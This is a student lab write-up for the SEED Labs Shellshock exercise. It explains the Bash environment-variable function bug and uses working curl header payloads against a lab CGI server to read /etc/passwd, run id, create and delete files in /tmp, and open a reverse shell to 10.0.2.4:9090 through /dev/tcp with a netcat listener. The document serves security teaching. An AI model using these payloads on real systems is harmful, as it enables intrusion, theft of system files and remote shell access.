# ShellShock Explained
Shellshock is a vulnerability in Bash Shell which allows the execution of arbitrary command through enviroment variable. 
Classic Bash allowed the "conversion" of environment variables to functions when a new shell was born.

## Task 1
The main objetive of this task is to experiment with a vulnerable bash shell. As in any ShellShock Attack, I first have to create an enviroment variable that holds the shellshock code.
export foo='() { echo "You have been hacked!"; }' // Command to create an enviroment variable named foo
Special attention must be given to the spacing of the function definition, since bash requires spaces around the curly brackets.
Then I used the given script (./bash_shellshock) to spawn a vulnerable shell. When I call foo, in that shell, I can verify that it works because "You have been hacked!" is printed. When I try to call foo in the classic bash shell nothing is printed, telling me that the vulnerability is no longer present.

## Task 2
The main objetive of this task is to get information about the enviroment variables of a server in order to understand how to pass data to the vurnerable bash program.

### Task 2.A
By accessing http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi, with the browser and the curl command, it is possible to see which variables are set by the browser. 
By using the curl command, with the help of the browser extension "HTTP Header Live", I was able to verify that the request sets the following environment variables: 
```
HTTP_HOST
HTTP_USER_AGENT
HTTP_ACCEPT
HTTP_ACCEPT_LANGUAGE
HTTP_ACCEPT_ENCODING
HTTP_CONNECTION
HTTP_UPGRADE_INSECURE_REQUESTS
```
These variables are set by the browser because their values are the same as the ones that appear in the browser.

### Task 2.B
After executing the given commands, it is possible to conclude that:
  - curl -A changes the HTTP_USER_AGENT envrionment variable;
  - curl -e changes the HTTP_REFERERenvrionment variable;
  - curl -H "name:value creates an environment variable with the name and value provided.

## Task 3
The  main objective of this task is to launch a shellshock attack through the url http://www.seedlab-shellshock.com/cgi-bin/vul.cgi. To do this, the curl command must be used with the flags tested in  in order to change/create environment variables with shellshock code.

### Task 3.A
**Objective:** print the content of the /etc/passwd file.
**Command:** ``` curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi.```
**Output:** 
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats 
Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
### Task 3.B
**Objective:** get the server's process user ID.
**Command:** ```curl -e "() { :; }; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi.```
**Output:** ```uid=33(www-data) gid=33(www-data) groups=33(ww-data)```

### Task 3.C
**Objective: **create a file inside the /tmp folder and check wheter the file is created or not.
**Command: **
```
curl -H "func: () { :; }; echo Content_type: text/plain; echo; /bin/touch /tmp/hack_file" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
curl -H "func: () { :; }; echo Content_type: text/plain; echo; /bin/ls -l /tmp" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
```
**Output:** 
```
total 0 
-rw-r--r-- 1 www-data www-data 0 Mar 14 12:46 hack_file
```
### Task 3.D
**Objective:** delete the file created inside the /tmp folder.
**Command:**
```
curl -H "func: () { :; }; echo Content_type: text/plain; echo; /bin/rm /tmp/hack_file" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
curl -H "func: () { :; }; echo Content_type: text/plain; echo; /bin/ls -l /tmp" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
```
**Output:**
```
total 0 
```

## Questions
### Will you be able to steal the content of the shadow file /etc/shadow from the server? Why or why not?

The shadow file can only be read by the root user. In , it can be seen that the process is not running as root but as a user called 'www-data'. This user doesn't have permissions to read the contents the file in /etc/shadow. In order to read it, it woulb be necessary to perform a privilege escalation to root.

### HTTP GET requests typically attach data in the URL, after the ? mark. Can we use this method to launch the Shellshock attack? Please conduct your experiment and derive your conclusions based on your experiment results.

If we try to copy the shellshock code given to the curl command into the URL, the parameters are put into an environment variable on the server side. The problem is that special charactersm, such as a space, are sanitized and transformed. This canges the exploit, making it invalid. It can be concluded that this is not a viable method to launch a Shellshock attack.  

## Task 4
**Objective:** obtain a reverse shell to the target's machine.
**Method:**
  - Set up a netcat listener on port 9090 that will receive the connection from the target machine and from which the reverse shell will operate.
    - Use nc -nv -l 9090 command in Linux terminal
  - Get the IP address of the machine where the listener is running by using the ifconfig command.
  - ifconfig will output various IP address. Use one from an interface that is running.
  - Perfom the Shellshock Attack by using the command curl -H "func: () { :; }; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi.
    - /bin/bash -i launches an interactive shell.
    - /dev/tcp/10.0.2.4/9090 causes the output device of the shell to be redirected to the TCP connection to 10.0.2.4's port 9090.
    - 0<&1 tells the system to use standard output device as the standard input device. Since stdout is the TCP connection, this option indicates that the shell program will get its input from the same TCP connection.
    - 2>&1 causes the error output to be redirected to stdout, which is the TCP connection.

## Questions
In  why is it necessary to use echo Content_type: text/plain; and echo; in the curl commands?
In  is there any criteria to choose the IP address to use?
